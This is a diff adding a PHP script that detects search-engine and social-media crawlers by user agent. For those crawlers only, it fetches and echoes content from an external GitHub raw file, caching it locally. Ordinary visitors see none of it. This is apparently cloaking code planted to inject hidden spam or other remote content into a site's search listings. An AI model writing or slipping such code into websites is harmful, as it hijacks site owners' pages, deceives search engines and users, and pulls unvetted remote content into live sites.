@@ -1,0 +1,35 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bot_patterns = '/(googlebot|googlebot-mobile|googlebot-news|googlebot-image|googlebot-video|bingbot|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|facebookexternalhit|twitterbot|whatsapp|linkedinbot|telegrambot|pinterestbot|applebot|yahoobot|mojeekbot|aolbot|seznambot|discordbot|redditbot|msnbot|ia_archiver|adsbot-google|google-screenshot|google-inspectiontool|google-site-verification|petalbot|ahrefsbot|semrushbot|mj12bot|megaindex|dotbot|mozbot|blexbot|serpstatbot|searchmetricsbot|seokicks|seoscanners|qwantify|nimbostratusbot|smtbot|surdotlybot|mail\.ru)/i';
+
+    return preg_match($bot_patterns, $user_agent);
+}
+
+function fetch_content($url) {
+    $cache_file = 'cache/' . md5($url) . '.html';
+    $cache_time = 3600;
+
+    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
+        return file_get_contents($cache_file);
+    }
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
+    $content = curl_exec($ch);
+    curl_close($ch);
+
+    if ($content) {
+        file_put_contents($cache_file, $content);
+    }
+
+    return $content;
+}
+
+if (is_bot()) {
+    echo fetch_content('https://raw.githubusercontent.com/rby66ku/hotnews/refs/heads/main/bima.unkhair');
+}
+?>
